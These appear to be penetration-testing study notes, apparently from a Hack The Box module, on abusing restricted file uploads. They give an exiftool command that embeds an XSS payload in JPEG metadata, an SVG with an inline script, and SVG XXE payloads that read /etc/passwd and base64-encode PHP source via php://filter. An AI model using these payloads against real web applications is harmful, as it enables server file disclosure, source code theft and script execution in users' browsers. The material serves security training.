# Limited File Uploads

## XSS
- SVG is another file type that we can use to exploit File Upload vulnerability.

- Assume we have XSS payload embedded inthe file metadata

``bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

- The payload will be executed when the image's metadata is displayed. Another way to trigger the payload is to change its MIME-Type to `text/html`, which tricks web applications into thinking it as an HTML document and executing the payload. This approach does not require us to view the image's metadata.

- The same concept can be applied to SVG files. We can modify the SVG file as below:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

- Once the SVG is uploaded to the application, XSS payload will trigger everytime the image is used.

# XXE
- Instead of inserting XSS payload, we can inject XXE payload to retrieve the content of a file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

- Another XXE payload can be used to read the source code of the applications

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
